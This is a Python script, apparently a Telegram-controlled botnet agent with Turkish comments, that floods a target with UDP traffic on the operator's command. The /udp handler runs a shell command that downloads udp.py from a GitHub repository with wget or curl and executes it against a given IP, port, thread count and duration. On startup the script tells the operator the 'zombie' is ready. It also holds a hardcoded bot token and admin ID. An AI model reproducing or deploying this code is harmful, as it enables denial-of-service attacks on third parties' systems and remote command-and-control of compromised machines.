import os
import subprocess
import time
import sys

# --- OTOMATİK KÜTÜPHANE KURULUMU ---
def install_requirements():
    try:
        import telebot
    except ImportError:
        # Sunucuda pip yoksa diye önlem
        os.system(f"{sys.executable} -m pip install pyTelegramBotAPI")
        time.sleep(2)
        import telebot

install_requirements()
import telebot

# --- SENİN BİLGİLERİN ---
TOKEN = "8818747282:AAGHb-qVWw-4eCZiFCEx1MC3h7OnoXeNLtI"
ADMIN_ID = 2019064003

bot = telebot.TeleBot(TOKEN)

# --- /udp KOMUTU ---
@bot.message_handler(commands=['udp'])
def attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            args = message.text.split()
            if len(args) < 5:
                bot.reply_to(message, "❌ Kullanım: /udp IP PORT THREAD SÜRE")
                return
                
            target, port, threads, duration = args[1], args[2], args[3], args[4]
            
            # udp.py yoksa GitHub'dan çek, sonra vuruşu başlat
            cmd = f"wget -q -O udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py || curl -s -L -o udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py; python3 udp.py {target} {port} {threads} {duration}"
            
            subprocess.Popen(cmd, shell=True)
            bot.reply_to(message, f"🚀 Mermiler yağdırılıyor... \n🎯 Hedef: {target}:{port}\n⏰ Süre: {duration}sn")
            
        except Exception as e:
            bot.reply_to(message, f"❌ Hata: {str(e)}")

# --- /stop KOMUTU ---
@bot.message_handler(commands=['stop'])
def stop_attack(message):
    if message.from_user.id == ADMIN_ID:
        try:
            os.system("pkill -f udp.py")
            bot.reply_to(message, "🛑 Operasyon durduruldu!")
        except:
            pass

# Bot ilk açıldığında komutana sinyal çakar
try:
    bot.send_message(ADMIN_ID, "🧟 Zombi hazır usta! Emirlerini bekliyorum.")
except:
    pass

bot.infinity_polling()
